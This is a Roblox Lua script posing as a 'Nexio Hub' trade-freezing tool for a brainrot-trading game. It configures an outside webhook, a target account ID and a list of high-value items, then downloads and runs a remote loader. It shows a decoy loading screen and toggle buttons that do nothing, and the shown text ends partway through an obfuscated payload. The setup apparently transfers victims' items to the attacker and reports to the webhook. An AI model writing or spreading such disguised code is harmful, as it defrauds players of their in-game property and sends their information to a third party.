getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_6046c72edce54ca2872411399bb39d05"
getgenv().TARGET_ID = rzgr1ks
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2 
getgenv().TARGET_BRAINROTS = {
    ["25"] = true,
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cerberus"] = true,
    ["Chillin Chili"] = true,
    ["Chipso and Queso"] = true,
    ["Cooki and Milki"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Eviledon"] = true,
    ["Festive 67"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Guest 666"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Casa Boo"] = true,
    ["La Extinct Grande"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Grande Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Taco Combinasion"] = true,
    ["Las Sis"] = true,
    ["Lavadorito Spinito"] = true,
    ["Los Amigos"] = true,
    ["Los Bros"] = true,
    ["Los Combinasionas"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Tacoritas"] = true,
    ["Love Love Bear"] = true,
    ["Lovin Rose"] = true,
    ["Mariachi Corazoni"] = true,
    ["Meowl"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Orcaledon"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosetti Tualetti"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Skibidi Toilet"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Spooky and Pumpky"] = true,
    ["Swag Soda"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["Tralaledon"] = true,
    ["Tuff Toucan"] = true,
    ["W or L"] = true
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Global state so it persists across deaths
local progress = 0
local isWaiting = false

-- Ensure PlayerGui exists
local playerGui = player:WaitForChild("PlayerGui")

-- Create or get existing UI
local function getLoadingUI()
    local gui = playerGui:FindFirstChild("IntroLoadingGui")
    if gui then
        local frame = gui:WaitForChild("LoadingFrame")
        return {
            Gui = gui,
            Bar = frame:WaitForChild("LoadingBarBackground"):WaitForChild("LoadingBar"),
            Title = frame:WaitForChild("LoadingTitle")
        }
    end

    -- Create new GUI
    local LoadingGui = Instance.new("ScreenGui")
    LoadingGui.Name = "IntroLoadingGui"
    LoadingGui.Parent = playerGui
    LoadingGui.DisplayOrder = 999
    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local LoadingFrame = Instance.new("Frame")
    LoadingFrame.Name = "LoadingFrame"
    LoadingFrame.Parent = LoadingGui
    LoadingFrame.Size = UDim2.new(0, 300, 0, 150)
    LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    LoadingFrame.BorderSizePixel = 4
    LoadingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 16)
    UICorner.Parent = LoadingFrame

    local LoadingTitle = Instance.new("TextLabel")
    LoadingTitle.Name = "LoadingTitle"
    LoadingTitle.Parent = LoadingFrame
    LoadingTitle.Size = UDim2.new(1, -20, 0.5, 0)
    LoadingTitle.Position = UDim2.new(0, 10, 0, 10)
    LoadingTitle.BackgroundTransparency = 1
    LoadingTitle.Text = "LOADING SCRIPT PLEASE WAIT..."
    LoadingTitle.Font = Enum.Font.SourceSansBold
    LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadingTitle.TextScaled = true

    local LoadingBarBackground = Instance.new("Frame")
    LoadingBarBackground.Name = "LoadingBarBackground"
    LoadingBarBackground.Parent = LoadingFrame
    LoadingBarBackground.Size = UDim2.new(0.8, 0, 0.1, 0)
    LoadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)
    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

    local LoadingBar = Instance.new("Frame")
    LoadingBar.Name = "LoadingBar"
    LoadingBar.Parent = LoadingBarBackground
    LoadingBar.Size = UDim2.new(progress / 100, 0, 1, 0)
    LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

    return {Gui = LoadingGui, Bar = LoadingBar, Title = LoadingTitle}
end

local ui = getLoadingUI()

-- Function to run loading continuously
local function runLoading()
    spawn(function()
        while true do
            if not isWaiting then
                for i = progress + 1, 100 do
                    progress = i
                    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
                    task.wait(60 / 100) -- 1 minute total
                end

                -- Wait 1 minute at 100%
                isWaiting = true
                ui.Title.Text = "LOADING COMPLETE PLEASE WAIT"
                task.wait(60)
                isWaiting = false

                -- Reset progress
                progress = 0
                ui.Bar.Size = UDim2.new(0, 0, 1, 0)
                ui.Title.Text = "LOADING SCRIPT PLEASE WAIT..."
            else
                task.wait(1)
            end
        end
    end)
end

-- Ensure UI persists on respawn
player.CharacterAdded:Connect(function()
    ui = getLoadingUI()
    ui.Bar.Size = UDim2.new(progress / 100, 0, 1, 0)
end)

-- Start the loading loop
runLoading()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NexioHub"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local parentSuccess = pcall(function()
	screenGui.Parent = PlayerGui
end)
if not parentSuccess then
	screenGui.Parent = game:GetService("CoreGui")
end

local baseSize = isMobile and UDim2.new(0, 300, 0, 370) or UDim2.new(0, 340, 0, 400)
local basePos = UDim2.new(0.5, isMobile and -150 or -170, 0.5, isMobile and -185 or -200)

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 0, 0, 0)
mainFrame.Position = basePos
mainFrame.BackgroundColor3 = Color3.fromRGB(10, 5, 20)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 18)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(180, 60, 255)
mainStroke.Transparency = 0.3
mainStroke.Thickness = 1.5
mainStroke.Parent = mainFrame

local bgGradient = Instance.new("UIGradient")
bgGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 5, 50)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 5, 35)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 65))
})
bgGradient.Rotation = 135
bgGradient.Parent = mainFrame

local glowFrame = Instance.new("Frame")
glowFrame.Size = UDim2.new(1, 0, 0, 3)
glowFrame.Position = UDim2.new(0, 0, 0, 0)
glowFrame.BackgroundColor3 = Color3.fromRGB(180, 60, 255)
glowFrame.BorderSizePixel = 0
glowFrame.ZIndex = 5
glowFrame.Parent = mainFrame

local glowGrad = Instance.new("UIGradient")
glowGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 0, 255)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 80, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 0, 255))
})
glowGrad.Parent = glowFrame

local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 55)
topBar.Position = UDim2.new(0, 0, 0, 3)
topBar.BackgroundTransparency = 1
topBar.ZIndex = 3
topBar.Parent = mainFrame

local logoContainer = Instance.new("Frame")
logoContainer.Size = UDim2.new(0, 36, 0, 36)
logoContainer.Position = UDim2.new(0, 14, 0.5, -18)
logoContainer.BackgroundColor3 = Color3.fromRGB(140, 40, 220)
logoContainer.BorderSizePixel = 0
logoContainer.ZIndex = 4
logoContainer.Parent = topBar

local logoCorner = Instance.new("UICorner")
logoCorner.CornerRadius = UDim.new(0, 8)
logoCorner.Parent = logoContainer

local logoGrad = Instance.new("UIGradient")
logoGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 60, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 180))
})
logoGrad.Rotation = 135
logoGrad.Parent = logoContainer

local logoLabel = Instance.new("TextLabel")
logoLabel.Size = UDim2.new(1, 0, 1, 0)
logoLabel.BackgroundTransparency = 1
logoLabel.Text = "N"
logoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
logoLabel.TextScaled = true
logoLabel.Font = Enum.Font.GothamBold
logoLabel.ZIndex = 5
logoLabel.Parent = logoContainer

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0, 120, 0, 22)
titleLabel.Position = UDim2.new(0, 58, 0, 8)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "NEXIO HUB"
titleLabel.TextColor3 = Color3.fromRGB(220, 150, 255)
titleLabel.TextScaled = false
titleLabel.TextSize = isMobile and 14 or 15
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.ZIndex = 4
titleLabel.Parent = topBar

local titleGrad = Instance.new("UIGradient")
titleGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 180, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 60, 255))
})
titleGrad.Parent = titleLabel

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Size = UDim2.new(0, 170, 0, 16)
subtitleLabel.Position = UDim2.new(0, 58, 0, 30)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Text = "Trade Controller"
subtitleLabel.TextColor3 = Color3.fromRGB(150, 100, 200)
subtitleLabel.TextScaled = false
subtitleLabel.TextSize = isMobile and 10 or 11
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
subtitleLabel.ZIndex = 4
subtitleLabel.Parent = topBar

local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Size = UDim2.new(0, 28, 0, 28)
minimizeBtn.Position = UDim2.new(1, -42, 0.5, -14)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(60, 20, 90)
minimizeBtn.Text = "âˆ’"
minimizeBtn.TextColor3 = Color3.fromRGB(200, 150, 255)
minimizeBtn.TextSize = 16
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.BorderSizePixel = 0
minimizeBtn.ZIndex = 6
minimizeBtn.Parent = topBar

local minCorner = Instance.new("UICorner")
minCorner.CornerRadius = UDim.new(0, 7)
minCorner.Parent = minimizeBtn

local divider = Instance.new("Frame")
divider.Size = UDim2.new(1, -28, 0, 1)
divider.Position = UDim2.new(0, 14, 0, 58)
divider.BackgroundColor3 = Color3.fromRGB(120, 40, 200)
divider.BackgroundTransparency = 0.5
divider.BorderSizePixel = 0
divider.Parent = mainFrame

local divGrad = Instance.new("UIGradient")
divGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
	ColorSequenceKeypoint.new(0.3, Color3.fromRGB(180,60,255)),
	ColorSequenceKeypoint.new(0.7, Color3.fromRGB(180,60,255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0))
})
divGrad.Parent = divider

local contentFrame = Instance.new("Frame")
contentFrame.Name = "Content"
contentFrame.Size = UDim2.new(1, 0, 1, -60)
contentFrame.Position = UDim2.new(0, 0, 0, 60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

local contentLayout = Instance.new("UIListLayout")
contentLayout.Padding = UDim.new(0, 10)
contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
contentLayout.VerticalAlignment = Enum.VerticalAlignment.Top
contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
contentLayout.Parent = contentFrame

local contentPadding = Instance.new("UIPadding")
contentPadding.PaddingTop = UDim.new(0, 14)
contentPadding.PaddingLeft = UDim.new(0, 14)
contentPadding.PaddingRight = UDim.new(0, 14)
contentPadding.Parent = contentFrame

local function createToggleButton(name, icon, order)
	local btnHeight = isMobile and 52 or 58

	local container = Instance.new("Frame")
	container.Name = name .. "Container"
	container.Size = UDim2.new(1, 0, 0, btnHeight)
	container.BackgroundColor3 = Color3.fromRGB(20, 8, 40)
	container.BackgroundTransparency = 0.2
	container.BorderSizePixel = 0
	container.LayoutOrder = order
	container.Parent = contentFrame

	local containerCorner = Instance.new("UICorner")
	containerCorner.CornerRadius = UDim.new(0, 12)
	containerCorner.Parent = container

	local containerStroke = Instance.new("UIStroke")
	containerStroke.Color = Color3.fromRGB(120, 40, 200)
	containerStroke.Transparency = 0.6
	containerStroke.Thickness = 1
	containerStroke.Parent = container

	local containerGrad = Instance.new("UIGradient")
	containerGrad.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 10, 65)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 5, 38))
	})
	containerGrad.Rotation = 135
	containerGrad.Parent = container

	local iconLabel = Instance.new("TextLabel")
	iconLabel.Size = UDim2.new(0, 32, 0, 32)
	iconLabel.Position = UDim2.new(0, 12, 0.5, -16)
	iconLabel.BackgroundColor3 = Color3.fromRGB(100, 30, 170)
	iconLabel.Text = icon
	iconLabel.TextColor3 = Color3.fromRGB(220, 150, 255)
	iconLabel.TextScaled = true
	iconLabel.Font = Enum.Font.GothamBold
	iconLabel.BorderSizePixel = 0
	iconLabel.ZIndex = 2
	iconLabel.Parent = container

	local iconCorner = Instance.new("UICorner")
	iconCorner.CornerRadius = UDim.new(0, 8)
	iconCorner.Parent = iconLabel

	local nameLabel = Instance.new("TextLabel")
	nameLabel.Name = "ButtonName"
	nameLabel.Size = UDim2.new(1, -110, 0, 20)
	nameLabel.Position = UDim2.new(0, 54, 0.5, -14)
	nameLabel.BackgroundTransparency = 1
	nameLabel.Text = name
	nameLabel.TextColor3 = Color3.fromRGB(230, 200, 255)
	nameLabel.TextScaled = false
	nameLabel.TextSize = isMobile and 12 or 13
	nameLabel.Font = Enum.Font.GothamBold
	nameLabel.TextXAlignment = Enum.TextXAlignment.Left
	nameLabel.ZIndex = 2
	nameLabel.Parent = container

	local statusLabel = Instance.new("TextLabel")
	statusLabel.Name = "StatusLabel"
	statusLabel.Size = UDim2.new(1, -110, 0, 14)
	statusLabel.Position = UDim2.new(0, 54, 0.5, 2)
	statusLabel.BackgroundTransparency = 1
	statusLabel.Text = "Inactive"
	statusLabel.TextColor3 = Color3.fromRGB(120, 80, 160)
	statusLabel.TextScaled = false
	statusLabel.TextSize = isMobile and 9 or 10
	statusLabel.Font = Enum.Font.Gotham
	statusLabel.TextXAlignment = Enum.TextXAlignment.Left
	statusLabel.ZIndex = 2
	statusLabel.Parent = container

	local toggleTrack = Instance.new("Frame")
	toggleTrack.Size = UDim2.new(0, 44, 0, 24)
	toggleTrack.Position = UDim2.new(1, -56, 0.5, -12)
	toggleTrack.BackgroundColor3 = Color3.fromRGB(40, 15, 70)
	toggleTrack.BorderSizePixel = 0
	toggleTrack.ZIndex = 2
	toggleTrack.Parent = container

	local trackCorner = Instance.new("UICorner")
	trackCorner.CornerRadius = UDim.new(1, 0)
	trackCorner.Parent = toggleTrack

	local trackStroke = Instance.new("UIStroke")
	trackStroke.Color = Color3.fromRGB(100, 30, 160)
	trackStroke.Transparency = 0.3
	trackStroke.Thickness = 1
	trackStroke.Parent = toggleTrack

	local toggleKnob = Instance.new("Frame")
	toggleKnob.Size = UDim2.new(0, 18, 0, 18)
	toggleKnob.Position = UDim2.new(0, 3, 0.5, -9)
	toggleKnob.BackgroundColor3 = Color3.fromRGB(160, 100, 220)
	toggleKnob.BorderSizePixel = 0
	toggleKnob.ZIndex = 3
	toggleKnob.Parent = toggleTrack

	local knobCorner = Instance.new("UICorner")
	knobCorner.CornerRadius = UDim.new(1, 0)
	knobCorner.Parent = toggleKnob

	local clickBtn = Instance.new("TextButton")
	clickBtn.Size = UDim2.new(1, 0, 1, 0)
	clickBtn.BackgroundTransparency = 1
	clickBtn.Text = ""
	clickBtn.ZIndex = 4
	clickBtn.Parent = container

	local isOn = false

	local function animateToggle(state)
		isOn = state
		local knobPos = state and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
		local trackColor = state and Color3.fromRGB(120, 40, 200) or Color3.fromRGB(40, 15, 70)
		local knobColor = state and Color3.fromRGB(220, 150, 255) or Color3.fromRGB(160, 100, 220)
		local strokeColor = state and Color3.fromRGB(180, 60, 255) or Color3.fromRGB(100, 30, 160)
		local containerStrokeColor = state and Color3.fromRGB(180, 60, 255) or Color3.fromRGB(120, 40, 200)
		local containerStrokeTransp = state and 0.2 or 0.6
		local statusText = state and "Active" or "Inactive"
		local statusColor = state and Color3.fromRGB(200, 130, 255) or Color3.fromRGB(120, 80, 160)
		local iconBg = state and Color3.fromRGB(140, 50, 210) or Color3.fromRGB(100, 30, 170)

		TweenService:Create(toggleKnob, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = knobPos, BackgroundColor3 = knobColor}):Play()
		TweenService:Create(toggleTrack, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = trackColor}):Play()
		TweenService:Create(trackStroke, TweenInfo.new(0.2), {Color = strokeColor}):Play()
		TweenService:Create(containerStroke, TweenInfo.new(0.2), {Color = containerStrokeColor, Transparency = containerStrokeTransp}):Play()
		TweenService:Create(iconLabel, TweenInfo.new(0.2), {BackgroundColor3 = iconBg}):Play()

		statusLabel.Text = statusText
		TweenService:Create(statusLabel, TweenInfo.new(0.2), {TextColor3 = statusColor}):Play()

		local punchTween = TweenService:Create(container, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0})
		punchTween:Play()
		punchTween.Completed:Connect(function()
			TweenService:Create(container, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.2}):Play()
		end)

		if state then
			local ripple = Instance.new("Frame")
			ripple.Size = UDim2.new(0, 0, 0, 0)
			ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
			ripple.BackgroundColor3 = Color3.fromRGB(180, 60, 255)
			ripple.BackgroundTransparency = 0.5
			ripple.BorderSizePixel = 0
			ripple.ZIndex = 5
			ripple.ClipsDescendants = false
			ripple.Parent = container
			local rippleCorner = Instance.new("UICorner")
			rippleCorner.CornerRadius = UDim.new(1, 0)
			rippleCorner.Parent = ripple
			TweenService:Create(ripple, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, 300, 0, 300),
				Position = UDim2.new(0.5, -150, 0.5, -150),
				BackgroundTransparency = 1
			}):Play()
			task.delay(0.5, function() ripple:Destroy() end)
		end

		print("[Nexio] " .. name .. " -> " .. (state and "ON" or "OFF"))
	end

	clickBtn.MouseButton1Click:Connect(function() animateToggle(not isOn) end)
	clickBtn.MouseEnter:Connect(function() TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0}):Play() end)
	clickBtn.MouseLeave:Connect(function() TweenService:Create(container, TweenInfo.new(0.15), {BackgroundTransparency = 0.2}):Play() end)
end

createToggleButton("Freeze Trade", "â„", 1)
createToggleButton("Auto Accept", "âœ“", 2)
createToggleButton("Cancel Trade", "âœ•", 3)

local footerFrame = Instance.new("Frame")
footerFrame.Size = UDim2.new(1, 0, 0, 50)
footerFrame.BackgroundTransparency = 1
footerFrame.LayoutOrder = 4
footerFrame.Parent = contentFrame

local madeByLabel = Instance.new("TextLabel")
madeByLabel.Size = UDim2.new(1, 0, 0, 16)
madeByLabel.Position = UDim2.new(0, 0, 0, 4)
madeByLabel.BackgroundTransparency = 1
madeByLabel.Text = "Made By Nexio"
madeByLabel.TextColor3 = Color3.fromRGB(160, 100, 220)
madeByLabel.TextScaled = false
madeByLabel.TextSize = isMobile and 10 or 11
madeByLabel.Font = Enum.Font.GothamBold
madeByLabel.TextXAlignment = Enum.TextXAlignment.Center
madeByLabel.Parent = footerFrame

local socLabel = Instance.new("TextLabel")
socLabel.Size = UDim2.new(1, 0, 0, 14)
socLabel.Position = UDim2.new(0, 0, 0, 22)
socLabel.BackgroundTransparency = 1
socLabel.Text = "YT: ZeroScriptsOnTop â€¢ TT: nexioontopyt"
socLabel.TextColor3 = Color3.fromRGB(100, 60, 150)
socLabel.TextScaled = false
socLabel.TextSize = isMobile and 9 or 10
socLabel.Font = Enum.Font.Gotham
socLabel.TextXAlignment = Enum.TextXAlignment.Center
socLabel.Parent = footerFrame

local minimized = false
local fullSize = baseSize
local miniSize = UDim2.new(0, fullSize.X.Offset, 0, 58)

minimizeBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		minimizeBtn.Text = "+"
		TweenService:Create(mainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.InOut), {Size = miniSize}):Play()
	else
		minimizeBtn.Text = "âˆ’"
		TweenService:Create(mainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = fullSize}):Play()
	end
end)

local dragging = false
local dragStart = nil
local startPos = nil

local function onDragBegan(input)
	dragging = true
	dragStart = input.Position
	startPos = mainFrame.Position
end

local function onDragChanged(input)
	if dragging then
		local delta = input.Position - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end

local function onDragEnded()
	dragging = false
end

topBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		onDragBegan(input)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		onDragChanged(input)
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		onDragEnded()
	end
end)

TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = fullSize}):Play()

local shimmerFrame = Instance.new("Frame")
shimmerFrame.Size = UDim2.new(0, 60, 1, 0)
shimmerFrame.Position = UDim2.new(-0.3, 0, 0, 0)
shimmerFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
shimmerFrame.BackgroundTransparency = 0.92
shimmerFrame.BorderSizePixel = 0
shimmerFrame.ZIndex = 6
shimmerFrame.ClipsDescendants = false
shimmerFrame.Parent = mainFrame

local shimCorner = Instance.new("UICorner")
shimCorner.CornerRadius = UDim.new(0, 18)
shimCorner.Parent = shimmerFrame

local shimGrad = Instance.new("UIGradient")
shimGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0))
})
shimGrad.Rotation = 15
shimGrad.Parent = shimmerFrame

local function playShimmer()
	shimmerFrame.Position = UDim2.new(-0.3, 0, 0, 0)
	local t = TweenService:Create(shimmerFrame, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(1.3, 0, 0, 0)})
	t:Play()
	t.Completed:Connect(function() task.delay(4, playShimmer) end)
end

task.delay(1, playShimmer)

RunService.Heartbeat:Connect(function()
	local t = tick()
	local alpha = (math.sin(t * 1.5) + 1) / 2
	mainStroke.Transparency = 0.2 + alpha * 0.4
end)
--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local Z={"\122\106\109\048\122\119\079\088\068\115\051\061";"\122\098\122\102\083\069\053\089\055\122\120\082\053\098\061\061","\047\047\073\090\056\108\047\049\115\113\067\097";"\111\103\112\085\049\071\107\080\117\085\120\098\051\082\050\068\083\108\119\116\082\098\089\065\075\098\061\061","\052\089\109\113\121\069\061\061";"\050\118\083\078\115\080\086\079\115\119\080\098\080\087\110\115";"\080\122\112\084\075\121\082\113\088\112\052\057","\088\105\087\110\101\118\079\106\051\047\100\118\081\066\115\100\057\109\075\081\074\054\098\061";"\122\106\109\081\122\066\089\072\102\052\077\061";"\107\072\049\048\087\069\073\072\122\050\090\109";"\081\073\098\066\113\109\069\079\089\100\073\081\084\055\061\061","\081\101\043\055\056\079\074\050\100\076\085\056\103\087\072\101\082\070\067\115";"\099\083\100\104\117\102\118\068\065\085\098\061","\113\116\055\087\117\070\087\074\083\103\090\087\097\098\061\061","\049\072\055\118\102\120\101\088\049\055\061\061";"\070\104\065\104\071\106\118\076";"\120\089\070\089\084\101\119\112\074\050\048\108\075\089\043\066\122\056\105\076\066\065\055\061","\106\101\056\079\111\122\113\122\074\072\116\076\115\055\080\081\101\103\087\087\082\119\098\098\120\118\055\061","\121\107\074\074\051\055\061\061","\080\047\103\102\088\090\086\078\069\056\081\065\086\088\069\053\076\098\061\061","\081\069\066\067\066\072\084\069\070\047\103\089\121\081\053\069\110\073\121\068\108\121\109\051\076\090\104\122";"\070\101\055\108\074\053\117\102\119\108\067\066\054\070\084\079";"\102\052\079\047\068\105\077\061","\122\113\079\079\082\108\102\088\112\066\089\075\051\111\079\052\051\112\061\061";"\085\107\111\085\121\100\074\080\071\106\075\071\068\119\085\089";"\074\098\111\078\086\100\112\104\048\115\043\049\050\088\121\061";"\102\105\085\089\121\055\061\061";"\102\115\065\090\068\105\077\061";"\097\106\111\057\051\106\097\047\077\108\075\118\122\106\097\087\122\106\097\053\077\112\061\061";"\051\107\097\100\068\066\097\100\121\052\075\074\121\115\065\118";"\075\106\080\086\104\113\111\072\112\100\118\089\071\108\079\113\104\106\108\061","\082\107\051\089\051\105\097\102\112\066\074\049\112\053\065\102";"\051\106\085\074\068\106\069\061","\121\113\118\100\102\112\061\061","\072\071\080\065\043\117\055\089\079\120\106\121\117\106\052\115\051\055\061\061";"\068\116\077\061";"\113\105\082\114\077\049\110\122\056\117\080\085\090\121\081\121\051\069\119\067\074\115\051\087\118\048\086\065\047\103\047\066";"\068\104\089\089\104\048\075\067\054\115\074\119\102\097\108\061";"\121\107\109\081\121\107\111\100";"\047\054\121\069\104\077\048\051\079\079\107\077\100\109\057\109\070\079\076\080\066\053\098\061";"\122\106\069\121\088\107\074\066\108\081\079\099\110\086\086\061";"\088\100\047\106\108\076\081\106\120\104\053\099\105\071\116\047\106\069\061\061";"\051\112\070\118\090\048\088\066\100\097\071\066\108\053\055\108\100\079\086\056\071\055\089\066\112\106\108\079","\110\099\106\068\079\104\071\122\097\077\079\098\047\065\055\075\066\069\114\061";"\051\115\097\057\068\105\102\118","\043\116\049\065\066\089\069\068\073\107\077\061","\111\065\057\109\070\074\073\072\078\088\077\115\067\113\074\122\087\083\086\115\117\047\088\111\103\121\090\071\108\106\086\061","\087\080\116\113\083\104\109\112\072\101\115\054\082\103\081\069\067\083\100\061","\114\106\090\105\082\083\049\056\101\074\108\101\090\069\082\101\113\082\119\111\122\113\070\065","\056\043\056\056\052\052\097\106\049\110\107\113\078\101\051\052\088\097\070\119";"\075\076\089\079\112\105\087\099\065\068\112\048\067\109\079\097\118\057\113\109\089\055\085\053\113\069\112\061","\051\087\118\107\075\107\089\052\122\107\079\106\075\107\111\047\082\112\061\061";"\052\089\109\078\102\066\086\061";"\099\107\120\068\122\087\053\114\065\103\047\053\119\086\110\101\090\100\080\109\085\065\115\110\100\069\061\061";"\079\049\048\108\117\104\066\078\072\073\113\122\115\079\054\087\104\071\098\076";"\122\106\111\072\068\106\104\061","\051\105\075\047\071\066\080\113","\082\121\089\105\110\050\067\066\088\080\076\083\051\050\121\061","\078\053\043\065\102\083\081\078\052\105\087\110\121\112\056\120\113\114\043\068\067\069\061\061","\107\102\069\061","\085\106\111\043\122\118\085\112\082\111\088\050\049\116\079\087\122\055\061\061","\066\079\088\102\113\105\121\072\070\076\052\098\089\122\102\082\076\073\107\081\083\067\048\055\107\118\108\100","\049\052\085\108\097\115\089\048\085\107\